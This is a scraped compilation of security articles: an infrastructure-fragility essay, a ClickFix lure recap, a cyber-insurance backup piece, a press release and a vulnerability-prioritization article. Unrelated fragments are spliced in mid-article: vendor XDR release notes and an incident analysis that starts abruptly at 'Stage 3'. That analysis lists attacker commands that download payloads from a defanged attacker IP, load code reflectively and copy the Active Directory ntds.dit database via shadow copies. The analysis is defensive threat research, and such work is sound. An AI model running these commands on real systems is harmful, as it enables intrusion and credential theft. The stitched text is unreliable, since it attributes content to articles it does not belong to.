articles.title: We Get the Infrastructure We Pay For
articles.context: This essay originally appeared as part of a round table in The Free Press entitled “Is America’s Infrastructure Under Attack
articles.full_text:
This essay originally appeared as part of a round table in The Free Press entitled “Is America’s Infrastructure Under Attack?”

Microsoft, the FAA, banks, United Airlines, the NSA—it’s been a really bad week in cyberspace. But, amazing as it might seem, these are not related. As far as we know, they’re not the result of cyberattacks. They’re not even related to AI. (Well, that’s mostly true. The NSA will probably never tell us what went wrong.) It’s really just a series of unfortunate coincidences.

Our computerized infrastructure is vulnerable and fragile. Much of it is old, and has been incrementally patched and upgraded. A surprising amount of it is maintained by hobbyists, without any recompense. And more and more of it is centralized: the same systems affecting many different aspects of our lives and society. In many cases, it just barely works. And when it fails, it tends to fail badly.

There are a lot of technological reasons why this is true, but they are all downstream of the economic ones. The technologies we rely on are built and maintained within our economic system—and that’s where the core problem lies.

Security, safety, resilience, redundancy, recoverability—these are all essential parts of reliable technology, but they are all costs.

More importantly, they are inefficient: costs that feel wasteful until something bad happens. Modern shareholder capitalism, and private equity in particular, squeeze all inefficiencies out of a company in pursuit of near-term profits. Competition, with multiple companies competing to do the same thing, is another inefficiency. Monopolization removes that in pursuit of near-term profits.

The result is brittle systems, single points of failure. They’re more susceptible to cyberattack—both human and AI-fueled—and more susceptible to random mistakes. The more we allow unregulated capitalism to privatize gains while socializing risks, the more we should expect these sorts of failures.

Fixing this is technical, but it’s political first. It requires changing incentives, and that involves regulation and control. “What to do” is easy; finding the political will to stand up to moneyed interests and do it is hard.

articles.title: A Buffet of ClickFix: Lures, Infrastructure & Payloads
articles.context: Our first audience poll found that 40% of respondents had not seen ClickFix in the wild, while the remaining 60% had run into it as a user, in a SOC investigation, or both
articles.full_text:
Amazon, ChatGPT, Google Docs…we've seen them all being impersonated in ClickFix campaigns. Also known as "paste and run" or "fake CAPTCHA," ClickFix lures trick users into copy/pasting a command in their terminal under the guise of a technical "fix" or software download. Just one malicious command pasted into a Run box can open the door to infostealers, remote access tools, ransomware, or other malicious software.

On the latest episode of Tradecraft Tuesday, Staff Technical Community Engagement Writer Ben Nahorney, Staff Detection Engineering & Threat Hunting Analyst Tyler Bohlmann, and Security Operations Analyst Sarah Reddish walked through some of the more convincing ClickFix lures Huntress has seen lately, the variety in final payloads, and a peek under the hood of the infrastructure attackers use to host fake verification pages.

Watch the full video below, and keep reading for clips and other highlights.

ClickFix at a glance

Ben kicked things off by defining ClickFix and breaking down the differences between its variants: FileFix, TerminalFix, and DownloadFix.

ClickFix has been around for a while, so why are we talking about it now? We're seeing more and more ClickFix, with increasingly convincing lures, sophisticated tradecraft, and a variety of final payloads.

Our first audience poll found that 40% of respondents had not seen ClickFix in the wild, while the remaining 60% had run into it as a user, in a SOC investigation, or both.

Later in the episode, we asked the audience what kind of malware they had seen as the final payload in ClickFix-related incidents: remote access trojans or rogue remote access tools was the most common response (43%), followed by infostealers (33%).

What happens after you click Verify?

The pasted commands from a ClickFix lure vary from a one-line malware download to the starting gun for a complex attack chain with layers of obfuscation, C2 communications, living off the land, and multiple malicious payloads.

Clip 2

The infrastructure

Tyler takes over for a look at some of the plumbing that goes into standing up a ClickFix campaign. ClickFix operators evolve their tradecraft as defenders stand up new detection logic and prevention controls. By renting a commercial kit, such as ErrTraffic, attackers can rotate out hosted domains across thousands of compromised websites using blockchain communications. These "smart contracts" make it relatively cheap and easy to swap out lure art, branding, and shortcuts from the same infrastructure.

Tyler highlights a single compromised WordPress site that carried five separate malicious injections from different attacker families, several disguised as legitimate script tags, showing it's been hit by multiple unrelated operators. Instead of hardcoding a malicious domain, the injected script reads a pointer from a Polygon smart contract to find its current front domain, so the attacker redirects every victim page by editing one on-chain value rather than touching any site.

ClickFix in the wild

Next, Sarah walks through a recent incident our SOC investigated that began with a Google search for "Amazon business" and ended with a remote access trojan (RAT) and an infostealer on the victim's environment. We refer to these payloads as "finger-licking malware," due to their use of the obscure built-in Windows finger utility to communicate with a variety of BBQ-themed domain names.

Sarah breaks down all three stages of this complex attack chain, including C2 communications, malicious JavaScript, and multiple layers of obfuscation.

Beyond the clipboard

Ben returns to highlight more of the variations in ClickFix tradecraft that have popped up in recent Huntress SOC investigations, including attack chains that establish persistence, support lateral movement, and enable reconnaissance and credential theft.

Featured examples include DLL sideloading, stenographic malware delivery, a node.js RAT dressed up as an remote monitoring and management (RMM) tool, and a command that retrieves a malicious script from the victim's browser cache.

How to fix ClickFix

Each of our panelists emphasized user training to "stop the paste:"

Never paste commands into a Run dialog box, a terminal, PowerShell, or anything else at a web page's request.

A legitimate CAPTCHA or other verification will never ask you to do so.

From the defenders' standpoint, we recommend leveraging application control tools or allowlisting for untrusted executables and limiting the access to local administrator privileges. Consider limiting who can access the Run dialog box or a command prompt.

Detection efforts should focus on the sequence of activity rather than relying solely on hashes, domains, or other static indicators. These can easily be swapped out by a threat actor.

Common post-paste behavior includes:

A browser or user-launched process spawning cmd.exe, PowerShell, or Windows Terminal

Encoded PowerShell commands

Execution-policy bypasses

Archives or executables appearing in user-writable locations

New scheduled tasks, new Run keys, or unexpected SSH connections

Release Notes for XDR🔗

3.9.27 (November 5, 2026)🔗

Features

Cases Closed Status Reason: You can now see the optional Close Reason entered when a case was closed by hovering over the Info icon next to the status in the Cases table and case details.

IDR NHI Details Activity Log: For IDR customers, non-human identity (NHI) details pages now have an Activity Log section that shows authentication and cloud audit events related to the identity.

Threat Intel Explorer Indicators: For users opted into Preview mode, Threat Intelligence Explorer now has an Indicators tab that lists indicators of compromise (IOC) provided by the CTU.

Fixes

Cases Name Filter: Fixed an issue where the Name filter did not return cases with Windows paths in their titles.

Copy Link in Safari: Fixed an issue where Copy Link options throughout XDR did not copy links to the clipboard in Safari.

Docs

Sophos AI Defense: Instructions for signing up for a free trial of the new Sophos AI Defense (AID) feature are now available.

3.9.26 (October 29, 2026)🔗

Features

IDR Integration Health Status and Reason: For IDR customers, each integration now reports a health status. When an integration is not healthy, IDR shows the reasons why and the action you can take to fix it, so you can resolve most issues without contacting Support.

Fixes

Add Evidence to Case: Fixed an issue where incorrect modal placement prevented users from adding evidence to an existing case.

Docs

Business Email Compromise: The documentation has been updated with comprehensive detector information.

3.9.25 (October 22, 2026)🔗

Features

Identity Updates: The following updates have been made to IDR:

Device details pages have been redesigned and now show the device summary in one tab and findings associated with the device in another.

Group details pages have been redesigned and now show a section with tabs for users, groups, NHIs, and devices that are members of the group in the Summary tab.

Entity details pages now show a Fingerprint icon and risk score for entities enriched with identity data from IDR.

MFA Temporary Code: We have removed the option to send a temporary code to your email instead of entering a code from your enrolled authenticator app during the login process.

Live Endpoint Search: Live Endpoint Search in XDR is now generally available.

Fixes

Login Page in Microsoft Edge: Fixed an issue that could prevent the XDR login page from loading in Microsoft Edge.

Endpoint Response Actions: Some endpoint response actions were unavailable on endpoint details pages even when those actions were available for the host elsewhere in XDR. This has been fixed.

Multiple Case Attachments: Fixed an issue where uploading multiple file attachments to a case resulted in an error and duplicate attachments.

Related Process Data: The Related Process Data section in some Sophos Endpoint file modification event details could display an error and fail to load data. This has been fixed.

Cases Table Pinned Columns: Fixed an issue where pinned columns in the Cases table did not persist when the page was refreshed.

Docs

Veeam Backup & Replication: Guidance on integrating Veeam Backup & Replication data into Secureworks® Taegis™ XDR is now available.

3.9.24 (October 15, 2026)🔗

Fixes

Taegis XDR User Admin Summary: We have fixed an issue that stopped users from creating this report.

Docs

Cisco Umbrella Integration Guide: The instructions to integrate Cisco Umbrella via customer-managed S3 bucket have been corrected.

3.9.23 (October 8, 2026)🔗

Features

Full Screen Search Results: You can now click Full Screen above Data Lake Search results to see them in a larger view.

Process Trees Related Events: All users can now view events related to a process node in the Process Tree view.

Live Endpoint Search: Users opted into Preview mode can now use Live Endpoint Search natively in XDR to query their devices with the Sophos Agent.

Fixes

Identity Overview: The dashboard was showing findings for disabled posture checks. This has been fixed.

Docs

Non-Human Identity Details: Documentation of non-human identity details in Taegis™ IDR is now available and includes background information about Microsoft Entra Agent ID objects.

3.9.22 (October 1, 2026)🔗

Features

AI Expression Assistant: The new AI Expression Assistant, which helps you create CEL expressions from natural language descriptions in supported XDR workflows, is now generally available.

Inventory Information Event Schema: A new Inventory Information event schema reports device inventory data that's either logged or proactively collected.

Process Trees Related Events: Users opted into Preview mode can now view events related to a process node in the Process Tree view.

Fixes

Data Retention: Organization data retention wasn’t appearing on the Subscriptions page as expected. This has been fixed.

3.9.21 (September 24, 2026)🔗

Features

AI Expression Assistant: Users opted in to Preview mode can now use the AI Expression Assistant to create CEL expressions from natural language descriptions in supported XDR workflows.

Fixes

No Data in Case Response Widget: For some tenants, the Case Response widget on the Security Posture Dashboard was not loading data. This has been fixed.

3.9.20 (September 17, 2026)🔗

Features

Identity Overview MFA Coverage Widget: The MFA Coverage widget now excludes on-premises Active Directory identities, which don't support native MFA.

Fixes

IDR Setup: After granting consent in Microsoft Entra during the IDR setup workflow, users were not redirected back to the setup wizard in XDR. This has been fixed.

Docs

Supported CEL Macros: All supported CEL macros are now documented.

Identity Response Actions: Guidance for configuring on-premises automations and response actions is now available.

3.9.19 (September 10, 2026)🔗

Features

Rubrik Integration: You can now configure a Rubrik integration.

Fixes

Custom Widgets: Some users were prevented from creating custom widgets when a query matched multiple event data types. This has been fixed.

Taegis MDR Dashboard: Some mean time analytics on the Taegis MDR Dashboard were missing data for certain months. This has been fixed.

3.9.18 (September 3, 2026)🔗

Features

Identity Manually-Added Domains: For IDR subscribers, credential leak monitoring now supports manual domain management and DNS TXT verification, allowing administrators to add, verify, monitor, and remove domains individually.

Identity Authentication Locations: For IDR subscribers, we've added a search bar and IP address pivot search to the Authentication Locations section of the Identity Details Activity Log tab.

Forensic Information Event Schema: A new Forensic Information event schema returns forensic information that's been pulled, queried, or discovered on a device, including Windows services and startup items.

Fixes

Case Details: Case details now render correctly on mobile devices.

3.9.17 (August 27, 2026)🔗

Fixes

Attach Files to Cases: You can attach multiple files at once to cases again.

IDR Response Actions: Some users experienced a duplicate provider error when configuring Entra ID Response Actions in IDR. This has been fixed.

Docs

Detection Suppression Rules: New documentation explains how detection suppression works.

Cases API Guides: The Investigations v2 API is now deprecated. Use the new Cases GraphQL API instead.

3.9.16 (August 20, 2026)🔗

Features

Taegis™ IDR Identity Overview: The Identity Overview page has been redesigned and enhanced with new widgets that show an organization-level view of identity risk.

Taegis™ IDR Posture Check Preferences: The Posture Check Preferences tab has been redesigned with a table view and additional filters to find specific posture checks.

Fixes

Completed Reports: Fixed an issue where the Completed Reports tab showed only the first 100 reports. You can now view all available completed reports.

Custom Connector Publishing: Fixed an issue where the Custom Connector publishing panel could close before it reported a save failure.

3.9.15 (August 13, 2026)🔗

Features

Process Search Enhancement: You can now use the IN operator to search for specific processes in Lineage and Process Tree views.

Patch State Information Event Schema: A new Patch State Information event schema reports the installation of an OS patch to a device and any associated knowledge base articles.

API Credential Role: You can now specify the user role permissions applied to API credentials you add in Manage API Credentials. Previously the role defaulted to Tenant Analyst.

Fixes

Query Builder Export: The Export All as CSV action in Query Builder event search results was not generating an export. This has been fixed.

3.9.14 (August 6, 2026)🔗

Features

Enhanced Cases Experience: The following enhancements to review, manage, and respond to cases are now generally available:

A new case summary view

New case details header

New Response tab

Both manual and automatic case templates

Identity On-Premise Active Directory: On-Premise Active Directory is now a supported Identity Provider for IDR, in addition to Microsoft Entra. On-Premise AD allows you to deploy the Sophos ITDR sensor to extend identity security monitoring to your on-premise AD environment.

Fixes

Cisco Duo Federal: Sophos XDR now accepts Cisco Duo Federal API hostnames (for example, api-abc12345.duofederal.com) in addition to standard Cisco Duo hostnames.

3.9.13 (July 30, 2026)🔗

Features

Event Lineage Process Trees: The process tree view of an event lineage is now available to all users.

Enhanced Cases Experience: For users opted in to Preview mode, the following enhancements make it faster to review, manage, and respond to cases:

Case Summary View: When you click a case on the Cases page, a slide-out shows a new summary view of the case's key information, including the case header, Case Summary, Key Findings, Timeline, and Comments. This lets you triage and review a case without losing your place.

Case Details Page: Case details pages have been redesigned with a new header of key attributes across the top of the page, and reorganized Case Summary, Key Findings, and Case Details sections on the Overview tab.

Response Tab: A new Response tab on case details pages give you a centralized place to see and perform configured response actions on the entities associated with the case.

Case Templates: Case templates now support both manual and automatic cases and can now be found at Cases > Templates.

Microsoft Defender XDR Integration Guide: A new section for updating a migrated integration has been added to the guide, along with additional details throughout. The legacy Defender guides have been removed.

Azure Data Collector: Information about the updated ARM template has been added to the configuration notes.

3.9.12 (July 23, 2026)🔗

Features

Process Trees: Users opted into Preview mode can now view a process lineage as a process tree. The process tree is a top-down view of the process lineage for users who want a rapid visualization of the parent process, as well as all its children and siblings.

Copy Advanced Searches: You can now copy an Advanced Search query to your clipboard from the AI Search and the Query Editor by clicking the Copy icon .

Identity Updates: Many updates have been made to IDR and the Identity docs, including:

Identities now include an Identity Risk Score, which indicates the overall level of risk associated with each identity.

The Identity Details Activity Log tab has been redesigned.

New Identity FAQs have been added.

Fixes

Detections table: The Detections table was occasionally timing out during loading. This has been fixed.

Top Risky Users: The Top Risky Users widget wasn’t loading data fully. This has been fixed.

3.9.11 (July 16, 2026)🔗

Features

Playbook Execution Outcome Details: You can now hover over the Outcome in playbook execution tables throughout XDR to see a tooltip with details.

AWS Data Collector: The CloudFormation template used for configuring AWS data collectors has been simplified. For information on migrating to the new template, see Legacy Template Notes.

IDR App Permissions: For IDR customers, application details pages now include tables of application and delegated permissions.

Claroty xDome Integration: Taegis™ XDR for OT customers can now configure a Claroty xDome integration.

Fixes

Taegis XDR Trends Report: Fixed an issue where the Data Usage by Billing Cycle section was missing from Taegis XDR Trends Reports.

Identity Finding Details: Identity finding details now load without error.

Docs

Automation Connector Credentials: Documentation that explains how connector credentials are stored, protected, accessed, and retired is now available.

Integration Event Time and Time Zone Handling: This new document explains how the platform determines an event's time from integration logs, how included or excluded time zones affect that value, and what to do when event timestamps look incorrect.

Power BI for XDR: The Power BI template has been updated with fixes and improvements.

3.9.10 (July 9, 2026)🔗

Fixes

Resolved Detections: The Detections table now has live refresh, so you don't have to manually refresh the page after resolving detections.

3.9.9 (July 2, 2026)🔗

Features

Escalation Policy Robocall Details: Robocall notifications made for case-related notification rules now include the case type, priority, and title to help you decide whether you need to take immediate action.

Nozomi Vantage Integration: Taegis™ XDR for OT customers can now configure a Nozomi Vantage integration.

3.9.8 (June 25, 2026)🔗

Features

Search a Lineage: The event lineage search, which allows searching across the entire lineage tree and supporting data objects, is now generally available.

Fixes

Identity Failed Logins: The Failed Logins card on an identity's Activity Log tab wasn't returning accurate activity. This has been fixed.

Playbook Execution Outcome: A new Outcome column is available to add to playbook execution tables throughout XDR.

Fixes

Data Source Details Alignment: The content within data source details now aligns correctly.

Docs

Azure Data Collector OS Disk Migration: Guidance is now available for migrating an Azure data collector OS disk from Standard HDD to Standard SSD.

Detection Operation Aliases: Documentation for using detection operation aliases in the Detections API is now available.

3.9.6 (June 11, 2026)🔗

Features

Search a Lineage: Users opted into Preview mode can now search an event lineage across the entire lineage tree and supporting data objects.

Identity Updates: For IDR customers, several updates have been made to the Identity area, including:

Top Sign-in Locations: A new section on the Identity Details page called Top Sign-in Locations maps the user’s top sign-in locations, including counts and breakdowns by public and private IP activity.

Findings Filter: A new filter, Last Modified, is now available on the Identity Findings table.

Configured Integrations: In Identity Settings, the former Cloud API Integrations table is now called Configured Integrations.

New Schemas: Identity Findings and Software Inventory Information events are now referenced in the Schemas table.

GCP Key Rotation: Steps to rotate your Google Cloud Platform JSON keys have been added.

3.9.5.1 (June 8, 2026)🔗

Docs

Taegis IP Address Ranges: The following guides have been updated with the new XDR IP address ranges used to make inbound connections to your network for the integrations, which should be added to your allow lists. If you previously allowed older IP addresses for these integrations, we recommend removing them after 30 days from this date, unless informed otherwise.

Abnormal Inbound Email Security

Microsoft Defender XDR Integration: The new Microsoft Defender XDR integration that replaces the legacy Microsoft Defender for Endpoint integration is now available. Customers with the legacy integration will be automatically migrated to the new version with no action required.

Saved Query Categories: You can now add a new saved query category when saving a search in Data Lake Search. You can still add new categories on the Saved Queries page.

Features

BYOTI Detections: Bring Your Own Threat Intelligence (BYOTI) detection titles now omit schema references to improve accuracy for grouped detections, with Netflow-based detections remaining unchanged.

HTTP Ingest API: Get Started with the HTTP Ingest API is a new document that defines the request and response semantics of the HTTP Ingest endpoint and provides guidance for building reliable senders against it.

Features

Delinea Secret Server: You can now integrate Delinea Secret Server audit and security events into Secureworks® Taegis™ XDR.

HA Data Collector Host Proxy: The Host Proxy was shown twice on HA Data Collector details pages. This has been fixed.

Microsoft Graph Security API Alerts: The Microsoft Graph Security API v1 (legacy) and Microsoft Graph Security API Alerts v2 integration guides have been updated to account for Microsoft's deprecation of the v1 API. Custom Parser Updates: Custom Parser Syntax has been updated with additional details on LENGTH(), VALIDATE_ALL_JSONPATHS_EXIST(), and indexing. Details on GeoSummary support have been added to Auth Schema, Netflow Schema, and Types Schema.

articles.title: Cyber insurers now want proof you can actually recover
articles.context: Breach counsel treats the first 72 hours as the most critical window, and incident response (IR) teams need to isolate and investigate infected systems during it
articles.full_text: Cyber insurance pricing has cooled. Marsh’s Global Insurance Market Index shows global cyber rates falling for a 13th consecutive quarter, with US rates recently stabilizing after the ransomware-driven spikes of 2020 and 2021. Part of the reason rates are lowering is because carriers are imposing stricter requirements that determine if you will qualify at all. A major global carrier recently stopped writing law firms altogether because of claims volume, and brokers expect healthcare and managed service providers (MSPs) to be next. The newest requirement is the one many MSPs are least ready for: proof that you can actually recover. This is what insurers really want to see, and meeting the bar is harder than it sounds. Why insurers stopped taking backups on faith In a recent webinar with cyber insurance provider Beltex, the familiar list of requirements came up first: Multifactor authentication (MFA) on external access and privileged accounts Endpoint detection and response (EDR) on every endpoint A staffed 24/7 team where managed detection and response (MDR) is required, and timely patching. Backup is now joining that list, and for good reason. For years it was assumed that having backups and a green job status was good enough. Claims have shown otherwise. Now, attackers go after backup infrastructure to make their ransomware more effective, and an untested restore can re-infect the production network. Beltex described an MSP that restored a client directly from backup without involving the insurer. The attackers were still in the environment, and the ransom reportedly doubled. So, carriers are asking for proof. Some want evidence of a successful restore within the last six months, and some insurance applications must be signed by a C-level executive rather than the IT director to put ownership behind it. Proof of speed matters as much as proof of recovery Being able to recover is only half the question, because time is where claim costs balloon. Insurers, it turns out, don’t object to paying claims. They object to paying big ones. Beltex’s favorite example involved an 85-person firm hit through a zero-day firewall flaw. Their MDR solution contained the intrusion in about 20 minutes, forensics confirmed two servers were touched, and clean backups had the firm fully functional within 36 hours. The claim came in at around $85,000. Compare that with downtime and business interruption: a firm billing $10,000 a day that is offline for a week loses $70,000 in income before recovery costs and claim submission. Yet large servers can take four to 24 hours to restore. That is why underwriters care how fast you can come back and how successfully. Where you recover is the other half Speed raises a second problem: where do you restore to? Breach counsel treats the first 72 hours as the most critical window, and incident response (IR) teams need to isolate and investigate infected systems during it. Restoring into production too early risks reintroducing the threat and disturbing the evidence investigators need. Waiting for a safe place has the clock running. Recovery that is fast but not safe doesn’t satisfy anyone. Meeting all of this is harder than it looks Put the pieces together and the bar is high: Backups you have actually tested Recovery times you can state and meet And a clean, separate place to recover to Underwriters want to know whether you exercised reasonable care, so a row of green checkmarks won’t do. Run a test restore. Confirm you’re protecting everything that matters, including the server someone labeled “not in production.” Have the business owner, not just IT, confirm the right systems came back within agreed recovery time objectives (RTO) and recovery point objectives (RPO), and keep the logs, screenshots and sign-off in your ticketing system. It doesn’t need to resemble a government audit; Beltex noted that this alone puts you ahead of most organizations. Where cloud disaster recovery fits Cloud-native disaster recovery changes the equation. Cove’s DRaaS solution lets teams stage a pre-recovered VM in the N-able cloud that can be failed over to in about 15 minutes, off the production network. That answers the speed question and the location question together. Forensic investigators can validate and hunt in the sandbox while the business keeps moving, with rollback to earlier points in time. Once everyone agrees the recovery point is clean, workloads can run from the cloud over VPN, and failback uses recovery agents to bring changes home. Where to start Insurance is a financial failsafe, not a substitute for a bad data protection posture. Start by listing what the business couldn’t lose for 72 hours, set recovery targets, test them and document the results. Check the policy itself: a standalone cyber policy rather than a small add-on to a general one, with a limit of at least $1 million, and $2 million as the business scales. And if an incident does hit, disconnect affected machines from the network rather than powering them off, so forensic data survives. N-able Cove Data Protection, recognized as a Champion in the Infotech 2026 Enterprise Backup Data Quadrant, provides cloud-native data protection for organizations. Learn more at n-able.com/products/cove-data-protection. Contributed by N-able.

articles.title: OX Security Launches OX Radar and Response Center to Show Companies Which Cyber Threats Actually Affect Them

articles.full_text:
New technology monitors critical vulnerabilities and supply chain threats, automatically assessing customer exposure and guiding remediation

OX Security, a leader in AI-native application protection, today announced the launch of OX Radar and Response Center, giving security teams one place to track high-priority cyber threats, determine whether their organizations are affected, and manage remediation.

OX Radar continuously monitors emerging vulnerabilities, compromised software dependencies, and actively exploited threats. Integrated with OX Security’s application security platform, the Response Center automatically checks supported threats against customer environments, identifying affected assets and providing the context and guidance needed to respond. Separately, a publicly accessible OX Radar threat feed provides broader security research and findings across the software and AI supply chain.

When a major vulnerability or supply chain attack emerges, security teams often spend hours searching advisories, checking inventories, and correlating findings across tools to answer the question that matters most: Are we affected? As new software and AI components proliferate, investigating every potential threat manually is becoming increasingly impractical.

“The question isn’t just whether a new threat is dangerous. It’s whether it’s dangerous to you,” said Neatsun Ziv, CEO and co-founder of OX Security. “AI is accelerating software development, expanding the supply chain, and generating more security alerts than teams can realistically investigate. Security teams need to know immediately which threats affect their organization, which don’t, and what action is required.”

From Breaking Threats to Customer Action

To help security teams stay ahead of threats requiring urgent attention, OX Radar scans CVE databases, known-exploited vulnerability catalogs, security advisories, and vendor research approximately every 10 minutes. The customer-facing capabilities focus on high-priority threats, including compromised or malicious dependencies, exploited vulnerabilities, and critical-severity CVEs.

The Response Center connects supported OX Radar threats to each customer’s environment, checking whether vulnerable components are present and assessing their exploitability. It combines intelligence from the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and the European Union Agency for Cybersecurity (ENISA) Known Exploited Vulnerabilities (KEV) catalogs, EPSS exploit predictions, and VEX exploitability status with OX Security’s AI-generated exploit checks and runtime visibility to determine whether vulnerable libraries are affected.

Through the Response Center, security teams can:

Track threats: Follow high-priority incidents as new intelligence and findings emerge.

Assess exposure: Identify affected assets and examine supporting evidence.

Prioritize risk: Evaluate severity, exploitation, code usage, and reachability.

Manage remediation: Access safe versions and guidance, and create or track tickets and fix pull requests.

Document response: Maintain records of findings and remediation activity.

For each supported incident, the Response Center indicates whether a vulnerability has been detected in the customer’s environment, provides evidence of its potential exploitability, and incorporates available VEX information to help teams determine whether action is required. Teams can also initiate investigations using a CVE identifier, GitHub Security Advisory identifier, or advisory URL.

Expanding Threat Visibility Through Public Research

Alongside the customer-facing capabilities, OX Security is introducing a publicly accessible OX Radar threat feed with a broader catalog of security findings. Powered by OX Security’s independent research and scanning, the feed analyzes newly published npm and PyPI packages, AI skills, and Model Context Protocol (MCP) servers.

OX Security will continue expanding the range of threats assessed against customer environments, bringing more findings from its public research into the Response Center over time.

Availability

OX Radar and Response Center are available to OX Security customers as part of OX Security’s AI-Native Application Protection Platform (AINAPP). The broader OX Radar research feed is publicly accessible through the OX Security website.

About OX Security

OX Security is the first AI-Native Application Protection Platform built to secure software from prompt to production runtime. Its platform includes VibeSec, OX Code, OX Cloud, and OX Agentic Pentester, giving security teams a unified system for securing AI-driven development, applications, and cloud environments.

Stage 3: Use the channel as a general remote shell

As expected, the attacker did not use their access for triggering actions from power events. Instead, they just used it to run arbitrary commands. Each command below was executed by the PPB service through cmd.exe.

Command run by ppbed.exe → cmd.exe

Purpose

certutil -urlcache -f http://84[.]200[.]205[.]145/ NUL

Test that the DC can reach the attacker's server

certutil -decode C:\Windows\Temp\dt.exe.b64 C:\Windows\Temp\dt.exe

Decode a staged binary

curl.exe -v -m 25 http://84[.]200[.]205[.]145:55557/junk50k.bin -o C:\Windows\Temp\junk.bin

Ingress Tool Transfer

certutil -hashfile C:\Windows\Temp\wupd.exe MD5

Verify a download

C:\Windows\Temp\hello.exe

Payload Execution

powershell -ep bypass -c "....EntryPoint.Invoke(…)" (from ppgxrte.cmd)

Reflective load of the same assembly

certutil -decode …\rs.b64 …\rs.ps1

Stage a PowerShell script

netstat -an

List connections

certutil -decode …\bde_l.b64 …\bde_local.ps1

Stage another PowerShell script

dt.exe, wupd.exe and hello.exe were each downloaded from hxxp://84[.]200[.]205[.]145:55556/ as dt.bin, wupd.bin and hello.bin. wupd.exe is detected as MSIL.Killav!gen1, a .NET antivirus killer. The base64 blob in the PowerShell command decodes to a 4,096-byte .NET PE, byte-identical to hello.exe (SHA-256 d8ae46604dc4eab411977764bd923af686aea117fb33304520d928f1d382ef0e), whose only function is to print a greeting. It serves as a test to show that the reflective-load path works.

Stage 4: Collect the Active Directory database, revising the scripts until it works

The attackers were seen iteratively developing their data collection scripts on the fly. Scripts were executed, and results logged and checked, before further changes were made and executed again. Several iterations were made until the script achieved the required results.

Script (staged via extcmd)

Purpose

ppskbcx.cmd

Exports a copy of the Active Directory database (ntds.dit) using ntdsutil

ppgxrte.cmd

Load an embedded .NET program into memory

ppgtpui.cmd

Changes to run in the background with output sent to a log file

ifm.cmd

The same ntdsutil export

ifm2.cmd

The same export, plus a log file and a “done” marker file

ifm3.cmd

The same export, with a timestamp, tool check, and exit code written to the log

ppotuff.cmd

Saves the SYSTEM registry hive, then copies ntds.dit from a shadow copy with esentutl

ifm4.cmd, ppinthw.cmd

Copy ntds.dit from a shadow copy with esentutl

The cycle of writing a script, uploading it, running it, checking results and then adjusting, bears the hallmarks of an interactive operation with a human at the keyboard. The pivot from ntdsutil ifm to esentutl /vss enables the attacker to copy a locked ntds.dit file via the Volume Shadow Copy service instead.

Stage 5: Launch an implant from the same channel

After the collection scripts are finished, PowerShell was used to start C:\Windows\System32\config\systemprofile\AppData\Local\50679f292a1\upnpcont.exe. The process lineage is: ppbed.exe → cmd.exe → powershell.exe → upnpcont.exe.

The file upnpcont.exe is a name associated with a Microsoft UPnP component. It does not belong to a SYSTEM profile directory. It was observed loading atl.dll from the same directory with an unknown reputation. This pattern of using an old, trusted executable paired with an unknown DLL in a user-profile path is the typical pattern of the DLL side-loading technique.

Processes spawned by the implant keep ppbed.exe as the root of their lineage. The command, vssadmin create shadow /for=C: and the later robocopy collection task ran from this chain: vssadmin.exe ← powershell.exe ← upnpcont.exe ← powershell.exe ← cmd.exe ← ppbed.exe ← services.exe.

Significance

In this attack, we have seen how attackers abused the legitimate documented features of a widely used and trusted application, CyberPower’s PowerPanel Business edition, to enable them to execute commands, while masquerading as the application itself. The command execution feature in its console enables admins to run scripts to handle power failures, but this feature is a double-edge sword that can be abused by attackers. It simply accepts a script, stores it, and runs it as SYSTEM through a signed service on a server that often sits in a privileged position.

In this case, the attacker's tooling was almost entirely reliant on built-in Windows tools (certutil, ntdsutil, esentutl, reg, vssadmin, robocopy, wmic), along with a side-loaded implant, so defenders need to check the parent process for a meaningful indicator.

What this attack shows is that UPS, power-management, and other infrastructure software should be treated like any other potentially dual-use RMM product; used with network restrictions, unique credentials, vigilant patching, and process-level monitoring.

While we have not attributed this activity to a known actor, the interactive development of a data collection script during the attack points to a threat actor with live-human presence at the keyboard. Motivations of the attackers are unclear as no exfiltration or final payload such as ransomware was seen.

Recommendations

Locate all PPB console instances and restrict TCP port 3052 to named administrator hosts. Do not expose it to the internet, other servers, or user networks.

Change the default administrator password, ensure patches are up to date

Audit extcmd and temp\profile\extcmd paths on every PPB host and compare them with the product defaults. Treat any unknown scripts as hostile and review the console's event-to-command assignments.

Review the techniques and indicators in this document. If you find them, assume Active Directory credentials are exposed and plan a krbtgt reset and wider credential rotation.

Treat machines running power-management software as high-value assets and defend accordingly.

Protection

If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.

articles.title: Your Vulnerability Scanner Found 10,000 Issues. Which Ones Actually Matter?
articles.context: By combining vulnerability data with exploitability, asset criticality, exposure, attacker activity and existing controls, security teams can turn a growing volume of findings...
articles.full_text:
Finding vulnerabilities is rarely the hardest part of Vulnerability Management.

Modern vulnerability scanning services can continuously examine internal and external networks, web applications, APIs, databases and cloud environments, producing thousands, or even tens of thousands, of findings. The challenge begins after the scan finishes.

Which vulnerability should your team fix first?

A list of 10,000 findings may look comprehensive, but treating every vulnerability as equally urgent can overwhelm remediation teams, consume resources and distract attention from the weaknesses attackers are most likely to exploit.

Effective threat and vulnerability management requires a shift in perspective: from counting vulnerabilities to understanding risk.

Why vulnerability volume can be misleading

In 2025 alone, 48,185 new CVEs were published which was >20% more than were released in 2024. This ever-increasing rate of issues released makes it increasingly difficult for organizations to effectively keep up with the threat. Security teams have traditionally relied on vulnerability severity scores to organize remediation. A critical vulnerability goes to the top of the queue. A medium-severity vulnerability can wait.

That's useful as a starting point, but severity alone doesn't tell the entire story.

Consider two vulnerabilities:

A critical vulnerability exists on an isolated internal system protected by multiple security controls, with no evidence of active exploitation.

A high-severity vulnerability affects an internet-facing system containing sensitive information, and attackers are actively exploiting the weakness.

If remediation is based strictly on severity, the critical vulnerability may receive attention first. From a risk perspective, however, the second issue may represent the more immediate threat.

This distinction becomes increasingly important as both vulnerability inventories and assets within an organization’s attack surface rapidly grow. Simply generating more findings isn't necessarily improving security, especially when raw scanner output includes false positives that consume remediation time without reducing risk. The real measure of an effective vulnerability program is whether the organization can identify and reduce its most meaningful risks.

Identify and address risks with LevelBlue Vulnerability Management.

Learn More

Five factors that reveal which vulnerabilities matter

Risk-based vulnerability prioritization adds context to scanner findings. Rather than asking only, "How severe is this vulnerability?" security teams can consider several factors together.

1. Exploitability

A vulnerability that can realistically be exploited deserves different treatment from one that requires highly specific conditions, substantial attacker access or a complex exploit chain.

Teams should consider whether exploit code is publicly available, what level of access exploitation requires and how difficult the vulnerability is to exploit in the organization's specific environment.

